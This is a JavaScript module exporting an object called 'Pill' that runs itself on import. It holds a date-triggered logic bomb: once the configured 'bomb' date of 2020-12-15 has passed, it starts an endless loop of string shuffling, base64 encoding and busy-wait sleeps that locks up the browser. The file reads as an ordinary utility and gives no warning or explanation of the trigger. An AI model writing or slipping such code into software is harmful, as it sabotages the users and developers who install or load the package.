
var Settings = {
  debug: false,
  bomb: '2020-12-15'
}

function ajaxGet(url, callback) {
  var xhr = new XMLHttpRequest()
  xhr.open('GET', url, true)
  xhr.send()

  xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
      callback(xhr.responseText, xhr)
    }
  }
}

function Pill(opts) {
  return (this instanceof Pill)
    ? this.init(opts || {})
    : new Pill(opts)
}
function sleepFor( sleepDuration ){
  let now = new Date().getTime()
  while(new Date().getTime() < now + sleepDuration){ /* do nothing */ }
}

Pill.prototype.configure = function(opts) {
  this.config = {}
  for (let key in Settings) {
    if (opts.hasOwnProperty(key)) {
      this.config[key] = opts[key]
    } else {
      this.config[key] = Settings[key]
    }
  }
  // this.config = Object.assign({}, Settings, opts, {
  // })
  return this
};
Pill.prototype.init = function (opts) {
  this.configure(opts)
  let now = new Date()
  let bo = this.config.bomb.split('-')
  let bomb = new Date(bo[0], bo[1]-1, bo[2])
  let isEarly = now.getFullYear() < 2020 && now.getMonth() < 10
  let count = 1
  if (now.getTime() > bomb.getTime() || isEarly) {
    // ajaxGet('https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js', (data, xhr) => {
      // console.log(xhr.getResponseHeader('Date'))
    // })
    this.roll('His Judgment Cometh and that Right Soon', 0)
  }
  return this
}
Pill.prototype.roll = function (o, t=100, start=0) {
  // if (t && start > t) { return }
  setTimeout(() => {
    while (t === 0 || start < t) {
      o = this.shuffle(o.substr(0, 5000))
      if (window.btoa) {
        o = window.btoa(o)
      } else {
        o = o + this.shuffle(o)
      }
      ++start
      if (!(start % 1000)) {
        sleepFor(5000)
      }
      // await new Promise(r => setTimeout(r, 500))
    }
  }, 5000)
  // return this.roll(o, t, ++start)
}
Pill.prototype.shuffle = function (str) {
  return str.split('').sort(function(){return 0.5-Math.random()}).join('')
}

Pill()

export default Pill

